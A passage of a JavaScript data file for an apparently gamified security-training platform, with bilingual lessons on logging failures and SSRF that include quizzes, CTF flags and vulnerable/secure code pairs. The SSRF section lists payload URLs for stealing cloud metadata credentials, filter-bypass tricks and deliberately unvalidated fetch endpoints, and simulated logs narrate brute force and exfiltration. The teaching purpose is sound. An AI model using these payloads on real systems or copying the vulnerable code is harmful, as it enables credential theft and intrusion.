        <li>استخدم التسجيل المنظّم (JSON) لسجلات قابلة للمعالجة آلياً.</li>
        <li>أدرج: الطابع الزمني، معرّف المستخدم، عنوان IP، الإجراء، المورد، النتيجة.</li>
        <li>لا تسجّل أبداً بيانات حساسة: كلمات المرور، Tokens، PII، أرقام البطاقات.</li>
        <li>مركز السجلات في SIEM (Splunk, ELK Stack, Datadog).</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
        <li>تأكد من تسجيل جميع إخفاقات تسجيل الدخول والتحكم في الوصول والتحقق من المدخلات.</li>
        <li>تأكد من توليد السجلات بتنسيق يمكن استهلاكه بواسطة حلول إدارة السجلات المركزية.</li>
        <li>أنشئ مراقبة وتنبيهات فعّالة للكشف السريع عن الأنشطة المشبوهة.</li>
        <li>أنشئ أو تبنَّ خطة استجابة للحوادث والتعافي.</li>
      </ul>
    `,
    readTime: '7 min',
    xpReward: 110,
    realWorldCases: [
      { title: 'Equifax Breach (2017)', impact: 'Attacker persisted for 78 days undetected — no monitoring', cve: 'N/A' },
      { title: 'Target Breach (2013)', impact: 'Security alerts ignored for weeks — 40M card numbers stolen', cve: 'N/A' },
      { title: 'Yahoo Breach (2014)', impact: '3B accounts — breach not discovered for 2 years', cve: 'N/A' }
    ],
    attackVectors: [
      { name: 'Log Injection', description: 'Inject fake log entries to cover tracks or mislead analysts', severity: 'Medium' },
      { name: 'Log Deletion', description: 'Delete or truncate log files after gaining access', severity: 'High' },
      { name: 'Silent Persistence', description: 'Maintain access for extended periods with no detection', severity: 'Critical' },
      { name: 'Alert Flooding', description: 'Generate massive false positives to desensitize security team', severity: 'Medium' }
    ],
    theory: `
      <h3>What are Security Logging and Monitoring Failures?</h3>
      <p>This category exists to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response occurs at any time.</p>
      <h3>What Should Be Logged?</h3>
      <ul>
        <li>All authentication events: login success, failure, logout, MFA events.</li>
        <li>Access control failures: 403 responses, privilege escalation attempts.</li>
        <li>Input validation failures: SQL errors, XSS attempts, oversized inputs.</li>
        <li>High-value transactions: payments, data exports, admin actions.</li>
        <li>API rate limit violations and suspicious patterns.</li>
      </ul>
      <h3>Log Format Best Practices</h3>
      <ul>
        <li>Use structured logging (JSON format) for machine-parseable logs.</li>
        <li>Include: timestamp, user ID, IP address, action, resource, result.</li>
        <li>Never log sensitive data: passwords, tokens, PII, credit card numbers.</li>
        <li>Centralize logs in a SIEM (Splunk, ELK Stack, Datadog).</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>Ensure all login, access control, and server-side validation failures are logged with sufficient context.</li>
        <li>Ensure logs are generated in a format that can be consumed by centralized log management solutions.</li>
        <li>Establish effective monitoring and alerting so suspicious activities are detected and responded to quickly.</li>
        <li>Establish or adopt an incident response and recovery plan.</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE — Silent Error Handling
// ============================================
app.post('/login', (req, res) => {
  try {
    const user = db.authenticate(req.body);
    res.json({ token: generateToken(user) });
  } catch (err) {
    // VULNERABLE: Silent failure, no logging
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/admin', (req, res) => {
  if (!req.user.isAdmin) {
    // VULNERABLE: Access denied but not logged
    return res.status(403).json({ error: 'Forbidden' });
  }
});

// ============================================
// SECURE — Structured Logging + Alerting
// ============================================
const winston = require('winston');
const logger = winston.createLogger({
  format: winston.format.json(),
  transports: [new winston.transports.File({ filename: 'security.log' })]
});

app.post('/login', async (req, res) => {
  const ip = req.ip;
  const username = req.body.username;
  
  try {
    const user = await db.authenticate(req.body);
    logger.info({ event: 'LOGIN_SUCCESS', username, ip, timestamp: new Date() });
    res.json({ token: generateToken(user) });
  } catch (err) {
    // SECURE: Log failed attempts with context
    logger.warn({ event: 'LOGIN_FAILURE', username, ip, timestamp: new Date() });
    
    // SECURE: Alert on brute force pattern
    if (await getFailedAttempts(ip) > 5) {
      logger.error({ event: 'BRUTE_FORCE_DETECTED', ip, timestamp: new Date() });
      alertSecurityTeam(ip);
    }
    res.status(401).json({ error: 'Invalid credentials' });
  }
});`,
    quiz: [
      { q: 'How long did the Equifax attacker persist undetected due to poor monitoring?', options: ['7 days', '30 days', '78 days', '2 years'], answer: 2 },
      { q: 'Which log format is recommended for SIEM integration?', options: ['Plain text', 'CSV', 'JSON structured', 'XML'], answer: 2 },
      { q: 'What should NEVER be included in application logs?', options: ['Timestamps', 'User IDs', 'Passwords and tokens', 'IP addresses'], answer: 2 }
    ],
    simulation: {
      targetSite: 'https://logs.cyber-hub.com/viewer',
      vulnerableCode: `// Application error handling — VULNERABLE
app.use((err, req, res, next) => {
  // ⚠️ No logging at all
  res.status(500).json({ error: 'Something failed' });
});

app.post('/transfer', (req, res) => {
  const { amount, to } = req.body;
  
  // ⚠️ High-value transaction — not logged
  db.transfer(req.user.id, to, amount);
  res.json({ success: true });
});

// Result: Attacker can:
// - Attempt thousands of logins → no alert
// - Transfer funds repeatedly → no audit trail
// - Exfiltrate data → no detection`,
      terminalLogs: [
        '[02:15:22] SYS: Beginning stealth attack simulation...',
        '[02:15:23] RECON: Probing login endpoint — no rate limit detected',
        '[02:15:24] BRUTE: Attempting 1000 password combinations...',
        '[02:15:28] AUTH: Login successful after 847 attempts',
        '[02:15:29] CHECK: Reviewing server logs for our activity...',
        '[02:15:30] ALERT: ⚠️ Zero log entries found for 847 failed attempts!',
        '[02:15:31] PERSIST: Installing backdoor — no monitoring to detect it',
        '[02:15:35] EXFIL: Exfiltrating 50K records — no alerts triggered'
      ],
      stages: [
        { id: 1, title: 'Probe', description: 'Attempt multiple failed logins and check if any alerts are triggered', hint: 'Try 10+ failed logins and check if you get blocked or see any response change' },
        { id: 2, title: 'Verify Silence', description: 'Confirm that failed attempts are not being logged or alerted', hint: 'Check if the application behavior changes after many failures' },
        { id: 3, title: 'Persist', description: 'Demonstrate how an attacker can maintain access without detection', hint: 'Perform sensitive actions and verify no audit trail exists' },
        { id: 4, title: 'Implement Logging', description: 'Add structured logging for auth events and set up alerting thresholds', hint: 'Use winston with JSON format, log all 401/403 responses with IP and username' }
      ],
      flag: 'FLAG{L0gg1ng_1s_Y0ur_S3cur1ty_3y3s}'
    }
  },
  'm10': {
    id: 'm10',
    title: 'SSRF',
    icon: 'Globe',
    difficulty: 'MEDIUM',
    severity: 'High',
    type: 'Server-Side',
    cvss: '7.2',
    description: 'Server-Side Request Forgery — server fetches attacker-controlled URLs.',
    objective: 'Coerce the server into fetching metadata from the internal AWS instance at 169.254.169.254.',
    objective_ar: 'إجبار الخادم على جلب البيانات الوصفية من خدمة AWS الداخلية على 169.254.169.254.',
    defense: 'Enforce strict URL whitelisting and block access to internal IP ranges.',
    defense_ar: 'طبّق قائمة بيضاء صارمة للـ URLs وحظر الوصول لنطاقات IP الداخلية.',
    description_ar: 'تزوير الطلبات من جانب الخادم — الخادم يجلب URLs يتحكم فيها المهاجم.',
    theory_ar: `
      <h3>ما هو SSRF؟</h3>
      <p>تحدث ثغرات SSRF عندما يجلب تطبيق ويب موارد خارجية بدون التحقق من URL الذي يوفره المستخدم. يتيح للمهاجم إجبار التطبيق على إرسال طلبات لوجهات غير متوقعة، حتى خلف جدار الحماية أو VPN.</p>
      <h3>استغلال البيانات الوصفية السحابية</h3>
      <ul>
        <li>AWS: http://169.254.169.254/latest/meta-data/ — يُعيد بيانات اعتماد IAM ومعلومات الـ instance.</li>
        <li>GCP: http://metadata.google.internal/computeMetadata/v1/ — يُعيد tokens حساب الخدمة.</li>
        <li>Azure: http://169.254.169.254/metadata/instance — يُعيد معلومات الاشتراك والهوية.</li>
        <li>هذه النقاط متاحة من أي EC2/GCE/Azure instance افتراضياً.</li>
      </ul>
      <h3>تقنيات تجاوز الفلاتر</h3>
      <ul>
        <li>ترميز IP: 169.254.169.254 → 0xa9fea9fe (hex) → 2852039166 (decimal).</li>
        <li>DNS Rebinding: النطاق يُحلَّل إلى 127.0.0.1 بعد الفحص الأولي.</li>
        <li>IPv6: http://[::1]/ بدلاً من http://127.0.0.1/.</li>
        <li>Open Redirect: https://trusted.com/redirect?url=http://169.254.169.254/.</li>
        <li>URL Fragments: http://evil.com#@169.254.169.254/.</li>
      </ul>
      <h3>الوقاية</h3>
      <ul>
        <li>تعقيم والتحقق من جميع بيانات الإدخال التي يوفرها العميل.</li>
        <li>فرض قائمة بيضاء إيجابية لمخطط URL والمنفذ والوجهة.</li>
        <li>لا ترسل الاستجابات الخام للعملاء — أعد فقط البيانات الضرورية.</li>
        <li>عطّل إعادة توجيه HTTP.</li>
        <li>استخدم IMDS v2 من مزود السحابة (يتطلب طلبات قائمة على Token).</li>
      </ul>
    `,
    readTime: '9 min',
    xpReward: 150,
    realWorldCases: [
      { title: 'Capital One Breach (2019)', impact: '100M records via SSRF against AWS metadata service', cve: 'N/A' },
      { title: 'GitLab SSRF (2021)', impact: 'Internal network access and credential theft', cve: 'CVE-2021-22214' },
      { title: 'Shopify SSRF (2020)', impact: 'Access to internal Shopify infrastructure via webhook SSRF', cve: 'N/A' }
    ],
    attackVectors: [
      { name: 'Cloud Metadata SSRF', description: 'Access AWS/GCP/Azure metadata at 169.254.169.254', severity: 'Critical' },
      { name: 'Internal Port Scan', description: 'Use SSRF to scan internal network ports', severity: 'High' },
      { name: 'File Read via file://', description: 'Use file:// protocol to read local files', severity: 'High' },
      { name: 'Blind SSRF', description: 'No response returned but server makes the request (DNS/HTTP callback)', severity: 'Medium' },
      { name: 'SSRF via Redirect', description: 'Use open redirect on whitelisted domain to bypass filters', severity: 'High' }
    ],
    theory: `
      <h3>What is SSRF?</h3>
      <p>Server-Side Request Forgery (SSRF) flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall or VPN.</p>
      <h3>Cloud Metadata Exploitation</h3>
      <ul>
        <li>AWS: http://169.254.169.254/latest/meta-data/ — returns IAM credentials, instance info.</li>
        <li>GCP: http://metadata.google.internal/computeMetadata/v1/ — returns service account tokens.</li>
        <li>Azure: http://169.254.169.254/metadata/instance — returns subscription and identity info.</li>
        <li>These endpoints are accessible from any EC2/GCE/Azure instance by default.</li>
      </ul>
      <h3>Bypass Techniques</h3>
      <ul>
        <li>IP encoding: 169.254.169.254 → 0xa9fea9fe (hex) → 2852039166 (decimal).</li>
        <li>DNS rebinding: domain resolves to 127.0.0.1 after initial check.</li>
        <li>IPv6: http://[::1]/ instead of http://127.0.0.1/.</li>
        <li>Open redirect: https://trusted.com/redirect?url=http://169.254.169.254/.</li>
        <li>URL fragments: http://evil.com#@169.254.169.254/.</li>
      </ul>
      <h3>Prevention</h3>
      <ul>
        <li>Sanitize and validate all client-supplied input data.</li>
        <li>Enforce URL schema, port, and destination with a positive allow list.</li>
        <li>Do not send raw responses to clients — only return necessary data.</li>
        <li>Disable HTTP redirections.</li>
        <li>Use cloud provider's IMDS v2 (requires token-based requests, harder to exploit).</li>
      </ul>
    `,
    codeFix: `// ============================================
// VULNERABLE — Unvalidated URL Fetch
// ============================================
app.get('/fetch', async (req, res) => {
  const url = req.query.url;
  
  // VULNERABLE: No validation — attacker can request any URL
  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
});

// Attacker requests:
// /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

// ============================================
// SECURE — Strict URL Validation
// ============================================
const { URL } = require('url');
const dns = require('dns').promises;

const ALLOWED_HOSTS = ['api.trusted-partner.com', 'cdn.myapp.com'];
const BLOCKED_RANGES = ['10.', '172.16.', '192.168.', '127.', '169.254.'];

async function isSSRFSafe(urlString) {
  try {
    const parsed = new URL(urlString);
    
    // Only allow HTTPS
    if (parsed.protocol !== 'https:') return false;
    
    // Whitelist check
    if (!ALLOWED_HOSTS.includes(parsed.hostname)) return false;
    
    // Resolve DNS and check for internal IPs
    const addresses = await dns.resolve4(parsed.hostname);
    for (const ip of addresses) {
      if (BLOCKED_RANGES.some(range => ip.startsWith(range))) return false;
    }
    return true;
  } catch { return false; }
}

app.get('/fetch', async (req, res) => {
  const url = req.query.url;
  
  if (!await isSSRFSafe(url)) {
    return res.status(400).json({ error: 'URL not allowed' });
  }
  
  const response = await fetch(url);
  res.json({ data: await response.json() });
});`,
    quiz: [
      { q: 'What IP address hosts the AWS EC2 instance metadata service?', options: ['127.0.0.1', '10.0.0.1', '169.254.169.254', '192.168.1.1'], answer: 2 },
      { q: 'Which SSRF bypass technique uses a domain that resolves to an internal IP after the initial check?', options: ['IP Encoding', 'DNS Rebinding', 'IPv6 Bypass', 'URL Fragment'], answer: 1 },
      { q: 'What is the most effective primary defense against SSRF?', options: ['WAF rules', 'Rate limiting', 'Strict URL allowlist with DNS resolution check', 'HTTPS only'], answer: 2 }
    ],
    simulation: {
      targetSite: 'https://proxy.internal-services.io/fetch?url=http://169.254.169.254',
      vulnerableCode: `// URL proxy endpoint — VULNERABLE
app.get('/api/fetch', async (req, res) => {
  const { url } = req.query;
  
  // ⚠️ VULNERABLE: No URL validation
  try {
    const response = await fetch(url);
    const body = await response.text();
    
    // ⚠️ Returns full response to attacker
    res.send(body);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Attacker payload:
// GET /api/fetch?url=http://169.254.169.254/latest/meta-data/
// GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role`,
      terminalLogs: [
        '[03:45:10] SYS: Identifying URL fetch functionality...',
        '[03:45:11] FOUND: /api/fetch?url= parameter — potential SSRF',
        '[03:45:12] TEST: Requesting http://127.0.0.1/ → 200 OK (internal!)',
        '[03:45:13] PIVOT: Targeting AWS metadata service...',
        '[03:45:14] REQ: /api/fetch?url=http://169.254.169.254/latest/meta-data/',
        '[03:45:15] RESP: ami-id, hostname, iam, instance-id, ...',
        '[03:45:16] CREDS: /latest/meta-data/iam/security-credentials/EC2Role',
        '[03:45:17] LEAK: AccessKeyId: ASIA... SecretAccessKey: wJalrX...',
        '[03:45:18] EXPLOIT: Using stolen IAM credentials to access S3 buckets!'
      ],
      stages: [
        { id: 1, title: 'Detect', description: 'Find URL fetch functionality and confirm SSRF by requesting an internal address', hint: 'Try ?url=http://127.0.0.1/ or ?url=http://localhost/' },
        { id: 2, title: 'Metadata', description: 'Access the AWS metadata service to enumerate instance information', hint: 'Try ?url=http://169.254.169.254/latest/meta-data/' },
        { id: 3, title: 'Steal Credentials', description: 'Extract IAM role credentials from the metadata service', hint: 'Navigate to /latest/meta-data/iam/security-credentials/<role-name>' },
        { id: 4, title: 'Patch', description: 'Implement URL allowlisting with DNS resolution validation', hint: 'Resolve the hostname to IP and block RFC1918 + 169.254.0.0/16 ranges' }
      ],
      flag: 'FLAG{SSRF_AWS_M3t4d4t4_Cr3d_St34l}'
    }
  }
};
